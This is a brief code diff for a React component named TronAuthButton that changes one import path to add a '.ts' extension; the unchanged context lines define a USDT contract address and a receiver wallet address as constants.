@@ -1,7 +1,7 @@
 // src/components/tronAuthButton/TronAuthButton.tsx
 
 import React, { useState } from 'react';
-import { tronWeb, adapter } from './tronWallet';
+import { tronWeb, adapter } from './tronWallet.ts';
 
 const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const TRON_RECEIVER = 'THn2MN1u4MiUjuQsqmrgfP2g4WMMCCuX8n';
